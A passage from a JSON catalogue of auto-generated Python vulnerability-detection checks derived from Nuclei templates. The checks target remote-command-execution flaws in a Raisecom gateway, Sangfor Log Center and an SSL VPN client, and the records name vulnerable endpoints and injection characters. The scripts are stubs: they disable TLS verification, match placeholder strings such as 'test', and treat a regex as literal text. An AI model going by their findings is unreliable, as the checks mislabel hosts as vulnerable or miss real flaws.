timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "sqli",
          "prest",
          "auth-bypass",
          "sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_raisecom_rce",
        "name": "Raisecom Gateway vpn_template_style.php - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "The /vpn/vpn_template_style.php endpoint in Raisecom Multi-Service Intelligent Gateway is vulnerable to unauthenticated remote command execution. The stylenum parameter fails to properly sanitize user input, allowing attackers to inject system commands using backticks (`\\) or pipe (|`) characters.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; contains(content_type, \"text/html\") / [OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(content_type_2, \"text/plain\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{randstr}}"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_text_alpha(5))}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: raisecom-rce\nName: Raisecom Gateway vpn_template_style.php - Remote Command Execution\nSeverity: critical\nDescription: The /vpn/vpn_template_style.php endpoint in Raisecom Multi-Service Intelligent Gateway is vulnerable to unauthenticated remote command execution. The stylenum parameter fails to properly sanitize user input, allowing attackers to inject system commands using backticks (`\\) or pipe (|`) characters.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_raisecom_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"raisecom-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Raisecom Gateway vpn_template_style.php - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(content_type, \"text/html\") / [OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(content_type_2, \"text/plain\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Raisecom Gateway vpn_template_style.php - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_raisecom_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: raisecom-rce\nName: Raisecom Gateway vpn_template_style.php - Remote Command Execution\nSeverity: critical\nDescription: The /vpn/vpn_template_style.php endpoint in Raisecom Multi-Service Intelligent Gateway is vulnerable to unauthenticated remote command execution. The stylenum parameter fails to properly sanitize user input, allowing attackers to inject system commands using backticks (`\\) or pipe (|`) characters.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_raisecom_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"raisecom-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Raisecom Gateway vpn_template_style.php - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(content_type, \"text/html\") / [OR] DSL: status_code_1 == 200 && status_code_2 == 200; contains(content_type_2, \"text/plain\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Raisecom Gateway vpn_template_style.php - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_raisecom_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "raisecom",
          "rce",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_sangfor_cphp_rce",
        "name": "Sangfor Log Center - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Sangfor Log Center is vulnerable to RCE.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Windows IP, Log Helper' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sangfor-cphp-rce\nName: Sangfor Log Center - Remote Command Execution\nSeverity: critical\nDescription: Sangfor Log Center is vulnerable to RCE.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sangfor_cphp_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sangfor-cphp-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Sangfor Log Center - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Windows IP, Log Helper' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Windows IP, Log Helper']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Sangfor Log Center - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sangfor_cphp_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sangfor-cphp-rce\nName: Sangfor Log Center - Remote Command Execution\nSeverity: critical\nDescription: Sangfor Log Center is vulnerable to RCE.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sangfor_cphp_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sangfor-cphp-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Sangfor Log Center - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Windows IP, Log Helper' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Windows IP, Log Helper']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Sangfor Log Center - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sangfor_cphp_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "sangfor",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_sslvpn_client_rce",
        "name": "SSL VPN Client - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "SSL VPN Client is vulnerable to RCE.",
        "severity": "critical",
        "detection": "[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | mot(s) 'text/plain'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_text_alpha(5))}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sslvpn-client-rce\nName: SSL VPN Client - Remote Code Execution\nSeverity: critical\nDescription: SSL VPN Client is vulnerable to RCE.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sslvpn_client_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sslvpn-client-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"SSL VPN Client - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | mot(s) 'text/plain'\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', 'text/plain']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SSL VPN Client - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sslvpn_client_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, 